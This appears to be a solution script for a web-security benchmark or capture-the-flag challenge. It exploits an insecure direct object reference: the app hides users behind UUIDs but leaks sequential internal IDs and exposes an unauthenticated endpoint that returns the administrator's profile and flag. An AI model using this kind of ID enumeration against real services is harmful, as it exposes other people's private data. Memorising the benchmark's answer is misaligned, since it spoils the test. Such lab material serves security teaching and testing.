#!/usr/bin/env bash
# APEX-023-25 — "Complex IDOR with UUID Obfuscation" (tags: idor, enumeration)
#
# Users are addressed by UUID, which is the usual advice and does nothing on its
# own: the rows still have a sequential `internal_id`, the API leaks it in a
# debug header and in the export, and an undocumented
# `/api/users/by-internal/:id` reads a full profile by that number with no
# authentication at all. Row 1 is the administrator, and their `secret_note` is
# the flag.
#
# Obscurity is the only control here, so the exploit is one request to a path
# nobody published.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex023-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create --set path=/api/users/by-internal/1 | flag
